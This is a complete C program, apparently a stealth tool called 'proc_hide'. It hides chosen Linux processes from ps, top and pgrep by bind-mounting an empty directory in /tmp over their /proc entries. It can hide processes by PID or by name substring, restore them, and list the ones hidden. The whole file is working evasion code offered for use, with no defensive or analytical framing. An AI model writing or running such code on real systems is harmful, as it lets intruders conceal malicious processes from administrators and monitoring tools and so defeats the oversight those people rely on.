#define _GNU_SOURCE
#include <sys/mount.h>
#include <sys/stat.h>
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

static void cmd_hide(pid_t pid)
{
    char proc_path[64], empty_dir[128];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", (int)pid);
    snprintf(empty_dir, sizeof(empty_dir), "/tmp/.phide-%d", (int)pid);

    struct stat st;
    if (stat(proc_path, &st) < 0) {
        fprintf(stderr, "[!] /proc/%d not found\n", (int)pid); return;
    }

    if (mkdir(empty_dir, 0755) < 0 && errno != EEXIST) {
        perror("mkdir"); return;
    }

    if (mount(empty_dir, proc_path, NULL, MS_BIND, NULL) < 0) {
        perror("mount --bind"); rmdir(empty_dir); return;
    }

    printf("[+] PID %d hidden: /proc/%d now shows empty dir\n",
           (int)pid, (int)pid);
    printf("[*] verify: ls /proc/%d  (should be empty)\n", (int)pid);
    printf("[*] ps/top/pgrep can no longer see PID %d\n", (int)pid);
    printf("[*] to restore: %s unhide %d\n", "proc_hide", (int)pid);
}

static void cmd_unhide(pid_t pid)
{
    char proc_path[64], empty_dir[128];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", (int)pid);
    snprintf(empty_dir, sizeof(empty_dir), "/tmp/.phide-%d", (int)pid);

    if (umount2(proc_path, MNT_DETACH) < 0) {
        perror("umount"); return;
    }
    rmdir(empty_dir);
    printf("[+] PID %d restored in /proc\n", (int)pid);
}

static void cmd_hide_by_name(const char *name)
{
    DIR *d = opendir("/proc");
    if (!d) { perror("/proc"); return; }

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        char *end;
        pid_t pid = (pid_t)strtol(ent->d_name, &end, 10);
        if (*end) continue;

        char comm_path[64], comm[256];
        snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", (int)pid);
        FILE *f = fopen(comm_path, "r");
        if (!f) continue;
        if (!fgets(comm, sizeof(comm), f)) { fclose(f); continue; }
        fclose(f);
        comm[strcspn(comm, "\n")] = '\0';

        if (strstr(comm, name)) {
            printf("[*] found %s at PID %d\n", comm, (int)pid);
            cmd_hide(pid);
        }
    }
    closedir(d);
}

static void cmd_list_hidden(void)
{
    FILE *f = fopen("/proc/mounts", "r");
    if (!f) { perror("/proc/mounts"); return; }

    char line[512];
    printf("[*] bind-mounts over /proc/* (hidden PIDs):\n");
    int found = 0;
    while (fgets(line, sizeof(line), f)) {
        char dev[256], mp[256];
        if (sscanf(line, "%255s %255s", dev, mp) != 2) continue;
        if (strncmp(mp, "/proc/", 6) == 0) {
            char *rest = mp + 6;
            long pid = strtol(rest, NULL, 10);
            if (pid > 0) { printf("  PID %ld hidden\n", pid); found++; }
        }
    }
    fclose(f);
    if (!found) printf("  (none)\n");
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <hide|unhide|name|list>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "hide") == 0 && argc >= 3) cmd_hide((pid_t)atoi(argv[2]));
    else if (strcmp(argv[1], "unhide") == 0 && argc >= 3) cmd_unhide((pid_t)atoi(argv[2]));
    else if (strcmp(argv[1], "name") == 0 && argc >= 3) cmd_hide_by_name(argv[2]);
    else if (strcmp(argv[1], "list") == 0) cmd_list_hidden();
    else { fprintf(stderr, "unknown: %s\n", argv[1]); return 1; }
    return 0;
}
